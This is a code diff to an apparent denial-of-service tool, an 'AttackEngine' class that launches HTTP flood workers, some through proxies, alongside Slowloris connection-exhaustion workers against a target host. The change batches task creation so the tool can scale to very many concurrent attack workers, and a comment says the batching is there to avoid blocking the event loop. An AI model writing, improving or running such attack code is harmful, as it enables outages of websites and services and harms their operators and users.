@@ -128,17 +128,23 @@ class AttackEngine:
         slow_count = num_workers - flood_count
 
         workers = []
+
+        # Ramp up flood workers in batches to avoid blocking the event loop
         for i in range(flood_count):
             use_px = use_proxies and (i % 10 >= 3)
             workers.append(asyncio.create_task(
                 self._worker(d_session, base, port, method, deadline, use_px, p_timeout)))
+            if i % 200 == 199:
+                await asyncio.sleep(0)
 
         # Slowloris workers
         parsed = urlparse(target)
         host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
-        for _ in range(slow_count):
+        for i in range(slow_count):
             workers.append(asyncio.create_task(
                 self._slowloris_worker(host, port, deadline)))
+            if i % 100 == 99:
+                await asyncio.sleep(0)
 
         try:
             await asyncio.gather(*workers, return_exceptions=True)
